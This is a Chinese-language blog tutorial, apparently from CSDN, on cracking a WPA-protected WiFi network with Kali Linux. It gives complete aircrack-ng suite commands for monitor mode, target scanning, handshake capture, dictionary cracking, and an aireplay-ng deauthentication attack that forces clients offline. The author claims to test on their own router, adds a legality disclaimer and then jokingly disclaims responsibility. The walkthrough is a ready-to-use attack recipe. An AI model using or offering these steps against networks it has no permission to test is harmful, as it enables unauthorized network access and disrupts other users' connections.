# kali打WiFi的传统思路


一个很老wifi攻击手法

<!--more-->

注意：私自破解他人 WiFi 属于违法行为，我这里使用的是自己买的 迷你版路由器 作为学习和测试。明白了破解原理就知道应该怎么防范了。

一、软件&硬件环境
虚拟机：VMware Workstation 15.5.1 Pro

Kali：kali-linux-2020.4-installer-amd64.iso

无线网卡：RT3070、RTL8187 等，自行选择

字典：WPA.txt

二、前期配置
1、打开 USB… 服务
打开 VMware USB Arbitration Service 服务，首先是 Win+R，输入 services.msc，敲击 Enter 键。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201220215917734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDI3NDgy,size_16,color_FFFFFF,t_70)



找到 VMware USB Arbitration Service，然后启动服务就可以了。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201220215928268.png)

2、加载网卡
加载网卡之前，先完全启动 kali，然后 虚拟机 → 可移动设备 → 你的网卡 → 连接(断开与 主机 的连接)。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201220215940232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDI3NDgy,size_16,color_FFFFFF,t_70)

点击确定就行了。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201220215944728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDI3NDgy,size_16,color_FFFFFF,t_70)

查看网卡是否加载进来了。从图片中可以看出，名为 wlan0 的网卡已经加载进了 kali 中。

iwconfig
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020122022000598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDI3NDgy,size_16,color_FFFFFF,t_70)

三、正式开始
1、开启无线网卡的监听模式
查看网卡是否支持监听模式。

airmon-ng
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201220220049126.png)


注：从图中可以看到我的无线网卡 wlan0 是支持监听模式的。如果该命令没有任何输出则表示没有可以支持监听模式的网卡。

开启无线网卡的监听模式。

airmon-ng start wlan0
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201220220019566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDI3NDgy,size_16,color_FFFFFF,t_70)


开启监听模式之后，无线接口 wlan0 变成了 wlan0mon，可以使用 iwconfig 命令查看，如下图所示：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201220221008593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDI3NDgy,size_16,color_FFFFFF,t_70)

2、扫描当前环境的 WiFi 网络
使用 airodump-ng 命令列出无线网卡扫描到的 WiFi 详细信息，包括信号强度，加密类型，信道等。这里我们记下要破解WiFi 的 BSSID 和 信道，如图中我用红色框框标记出来的。当搜索到我们想要破解的 WiFi 热点时可以 Ctrl+C 停止搜索。

airodump-ng wlan0mon
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201220220127199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDI3NDgy,size_16,color_FFFFFF,t_70)

3、抓取握手包
使用网卡的监听模式抓取周围的无线网络数据包，其中我们需要用到的数据包是包含了 WiFi密码 的握手包，当有新用户连接 WiFi 时会发送握手包。

airodump-ng -c 1 --bssid 64:51:7E:02:45:6A -w ./hack wlan0mon
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201220220216538.png)


参数解释：



| 参数   | 含义                                            |
| ------ | ----------------------------------------------- |
| -c     | 指定 `WiFi` 的通道(channel)，不细解释，自行学习 |
| –bssid | 指定 `WiFi` 的 `BSSID`，也就是 MAC 地址         |
| -w     | 指定生成文件的名称                              |

使用客户端连接这个 WiFi。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201220220154386.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDI3NDgy,size_16,color_FFFFFF,t_70)

可以看到这里有握手包出现：WPA handshke: 64:51:7E:02:45:6A。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201220220208905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDI3NDgy,size_16,color_FFFFFF,t_70)

这是启动抓包命令后，生成的文件。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201220220433711.png)

4、进行 WiFi 密码的破解（跑包）
WPA.txt 是我上传到 kali 中的字典文件。

aircrack-ng -b 64:51:7E:02:45:6A -w ./WPA.txt ./hack-01.cap
参数解释：

| 参数 | 含义                                    |
| ---- | --------------------------------------- |
| -b   | 指定 `WiFi` 的 `BSSID`，也就是 MAC 地址 |
| -w   | 指定字典文件                            |

这不闲着也是闲着，就截了个动态图。以示我是真的在做，不是 P 图。

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020122022052028.gif)

瞅瞅，看看，结果出来了，这当然肯定是我把密码（FFA4E9ED17）写进去了的，不然真的要运行到猴年马月呀。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201220220529490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDI3NDgy,size_16,color_FFFFFF,t_70)

5、附加
如果抓不到 握手包，就先把连接 WiFi 的客户端踢下线，然后对方会再次连接 WiFi，这样就可以抓取 握手包 了。抓取完 握手包 之后就可以进行上面第 4 步的破解（跑包）了。

aireplay-ng -0 5 -a 64:51:7E:02:45:6A -c 7C:B3:7B:84:54:BC wlan0mon
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201220220539400.gif)


6、结语
能不能 破解 WiFi 网络，完全取决于你的字典是否足够强大。本文只提供学习思路，从来没有教唆他人去 破解 WiFi ，如有人举报，我不知道，我不会，我没有。请出门右拐。

————————————————
版权声明：本文为CSDN博主「边扯边淡」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/qq_43427482/article/details/111463630
